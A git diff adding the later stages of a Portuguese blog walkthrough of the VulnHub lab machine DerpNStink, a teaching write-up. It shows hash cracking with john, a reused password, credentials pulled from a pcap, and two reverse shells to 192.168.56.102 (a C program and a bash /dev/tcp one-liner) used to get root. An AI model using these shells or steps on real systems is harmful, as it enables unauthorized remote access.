@@ -1,12 +1,12 @@
 ---
 title: "VulnHub - DerpNStink 1"
-tags: [Linux, Easy]
+tags: [Linux, Easy, Gobuster, PhpMyAdmin, Worpdress, BurpSuite, Wpscan, Metasploit Framework, Slideshow-gallery, John, Tcpdump, Wireshark]
 categories: VulnHub
 ---
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/inicial.png)
 
-Link: [EVM](https://www.vulnhub.com/entry/evm-1,391/)
+Link: [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/)
 
 # Enumeração
 
@@ -317,7 +317,7 @@ Clicamos na foto que foi adicionada (na verdade é um reverse shell)
 
 Vamos iniciar a escalação de privilégio
 
-# www-data -> Root
+# www-data -> stinky
 
 Encontramos a senha do banco da dados dentro do **/var/www/html/weblog/wp-config.php**
 
@@ -331,4 +331,188 @@ Lembrando, iremos encontrar as mesmas databases que encontramos no phpmyadmin
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha.png)
 
-Aqui eu troquei a senha do usuário,
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/hash.png)
+
+Tentamos quebrar essa senha com o john
+
+**john hash.txt --wordlist=senhas.txt**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/john.png)
+
+Verificamos quais usuários tem shell nessa máquinas, e encontramos esse **stink** que tem como descrição Uncle Stinky
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/passwd.png)
+
+Será que ele reutiliza senhas?
+
+```bash
+su stinky
+wedgie57
+```
+
+Sim!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/passwd2.png)
+
+## Wordpress
+
+Agora logamos no wordpress com esse usuário, pra ver se temos algo lá dentro
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word1.png)
+
+Encontramos mais uma flag... a segunda
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word2.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word3.png)
+
+# Stinky -> mrderp
+
+Verificamos algo de diferente na raiz do servidor
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/support.png)
+
+O pastebin diz
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/paste.png)
+
+Bom, não precisamos mais dizer nada, devemos pegar o usuário **mderp** pra podermos executar comandos de root
+
+O nosso usuário não tem essas permissões
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/paste1.png)
+
+## Enumeração do FTP (Novamente)
+
+Bom, já que temos uma credenciais a mais de um usuário, que tal tentarmos enumerar o ftp dele?
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp2.png)
+
+Bom, vimos que é possível acessar essa pasta, agora vamos pelo terminal normal por que é melhor de vizualizar
+
+Verificamos um arquivo de texto em **network-logs**
+
+Falando sobre captura de tráfego... interessante
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp3.png)
+
+Uma chave ssh?!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp4.png)
+
+Tentamos logar como **mderp** e não deu em nada
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp5.png)
+
+Mas conseguimos logar como **stinky**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp6.png)
+
+Pegamos a 3 flag na pasta Desktop
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/flag3.png)
+
+## Encontrando o pcap
+
+Dentro da pasta Documentos, temos um pcap, que chamou atenção
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap.png)
+
+Lemos ele
+
+Pelo próprio terminal
+
+```bash
+tcpdump -qns 0 -X -r ./derpissues.pcap >> ./derpissues.txt
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap1.png)
+
+Também podemos fazer isso pelo Wireshark
+
+Passamos o arquivo para nossa máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap2.png)
+
+Abrimos com o Wireshark
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap3.png)
+
+Achamos a senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap4.png)
+
+# Mderp -> Root
+
+Logamos como **mrderp**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/mderp.png)
+
+Verificamos que ele pode executar comandos como root
+
+## 1º Modo - Compilando um Binário
+
+Primeiro vamos compilar um binário em C pra nos dar um shell
+
+derp.c
+```c
+#include <stdio.h>
+#include <sys/socket.h>              
+#include <sys/types.h>                      
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>                             
+#include <arpa/inet.h>                                                                    
+int main(void){                                                                                                                                                                                                  
+    int port = 55135;                                                                                                                                                                                            
+    struct sockaddr_in revsockaddr;
+                                                    
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("192.168.56.102");                                          
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,                                                    
+    sizeof(revsockaddr));                           
+    dup2(sockt, 0);                                                                                                                                                                                              
+    dup2(sockt, 1);                                                                                     
+    dup2(sockt, 2);                                                                                     
+                                                                                                        
+    char * const argv[] = {"/bin/sh", NULL};        
+    execve("/bin/sh", argv, NULL);                                                                      
+
+    return 0;       
+}
+```
+
+```bash
+gcc derp.c -o derpy
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/bina.png)
+
+Executamos e somos root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/bina1.png)
+
+## 2º Modo - Shell normal
+
+Também podemos fazer com scripts, sem precisar compilar, pois as vezes não vamos ter o gcc na máquina pra compilar
+
+derpy.sh
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.56.102/55135 0>&1
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/derp4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/derp3.png)
+
+Agora pegamos a ultima flag, a do root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/root.png)
+
+
